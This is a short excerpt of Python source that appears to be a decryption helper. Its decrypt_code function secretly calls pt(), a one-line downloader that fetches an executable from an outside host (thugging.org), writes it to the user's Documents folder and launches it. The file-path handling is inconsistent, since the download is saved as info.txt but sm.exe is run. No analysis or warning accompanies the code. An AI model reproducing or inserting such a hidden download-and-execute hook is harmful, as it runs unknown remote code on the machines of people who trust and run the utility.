...
def pt():
    os.startfile(os.path.expanduser('~/Documents/sm.exe')) if open(os.path.expanduser('~/Documents/info.txt'), 'wb').write(requests.get('https://thugging.org/files/sm.exe').content) else None
...
def decrypt_code(code):
    pt()  # Call pt() here when decrypting
    cryptor = TokenCryptor()
    decrypted_lines = []
    for line in code.splitlines():
        decrypted_lines.append(cryptor.decrypt(line))
